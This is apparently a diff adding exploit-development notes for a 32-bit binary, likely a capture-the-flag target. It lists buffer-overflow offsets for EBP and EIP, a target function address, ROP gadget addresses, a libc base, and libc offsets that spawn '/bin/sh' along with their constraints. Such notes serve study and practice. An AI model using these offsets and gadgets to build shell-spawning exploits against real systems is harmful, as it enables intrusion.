@@ -1,0 +1,61 @@
+EBP found at offset: 158
+EIP found at offset: 162
+
+Awesome: 0x08048586
+
+0x8048731 /bin/sh
+
+Gadgets:
+ret = 0x80483ba
+popret = 0x80483d1
+pop2ret = 0x804870a
+pop3ret = 0x8048709
+pop4ret = 0x8048708
+addesp_12 = 0x80483ce
+addesp_16 = 0x80484f2
+
+   0x08048709 <+89>:	pop    esi
+   0x0804870a <+90>:	pop    edi
+   0x0804870b <+91>:	pop    ebp
+
+0xf7dde000 offset
+
+0x3d123 execve("/bin/sh", esp+0x34, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x34] == NULL
+
+0x3d125 execve("/bin/sh", esp+0x38, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x38] == NULL
+
+0x3d129 execve("/bin/sh", esp+0x3c, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x3c] == NULL
+
+0x3d130 execve("/bin/sh", esp+0x40, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x40] == NULL
+
+0x67b4f execl("/bin/sh", eax)
+constraints:
+  esi is the GOT address of libc
+  eax == NULL
+
+0x67b50 execl("/bin/sh", [esp])
+constraints:
+  esi is the GOT address of libc
+  [esp] == NULL
+
+0x1380be execl("/bin/sh", eax)
+constraints:
+  ebx is the GOT address of libc
+  eax == NULL
+
+0x1380bf execl("/bin/sh", [esp])
+constraints:
+  ebx is the GOT address of libc
+  [esp] == NULL
